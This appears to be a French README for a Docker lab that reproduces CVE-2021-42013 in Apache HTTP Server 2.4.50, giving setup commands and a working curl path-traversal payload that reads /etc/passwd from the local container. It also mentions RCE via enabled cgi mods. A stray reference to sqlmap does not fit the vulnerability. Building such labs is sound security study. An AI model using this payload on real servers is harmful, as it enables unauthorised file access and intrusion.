# Dockerisation d'une Vulnérabilité : cve-2021-42013

Ce projet vise à dockeriser une vulnérabilité spécifique en utilisant Docker. L'objectif est de créer un environnement isolé dans lequel la vulnérabilité peut être exploitée et testée de manière sécurisée.

## Application vulnérable

Apache HTTP Server 2.4.50 - Remote Code Execution && Path Transversal

## Installation

Pour exécuter ce projet, vous devez avoir sur votre machine :

- [Docker](https://www.docker.com/)
- [Python](https://www.python.org/)
- [Curl](https://curl.se/)


Une fois les prérequis installé, vous pouvez cloner ce dépôt Git sur votre machine :

```bash
  git clone https://github.com/cybfar/cve-2021-42013-httpd.git

  cd Ccve-2021-42013-httpd

```

Une fois dans le répertoire, exécuter la commande si dessous pour mettre en place l'environement vulnérable:

```bash
  docker build -t apache-httpd-vuln .
  docker run -p 8000:80 apache-httpd-vuln

```

Accéder ensuite à l'application à l'adresse http://localhost:8000
Si tout va bien, vous devez voir s'afficher "It works"




## Exploitation de la vulnérabilité

L'exécution de ce payload avec `curl` ci dessous nous montre que la cible est vulnérable. Le script générera la commande sqlmap appropriée pour exploiter la vulnérabilité

```bash
  curl -v --path-as-is localhost:8000/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd

```
Ce payload peut accéder directement aux informations relatives à l'utilisateur dans le système sans le consentement de l'utilisateur.

Une fois que nous aurons activé les mods cgi ou cgid sur le serveur, cette vulnérabilité permettra à un attaquant d'exécuter des commandes arbitraires
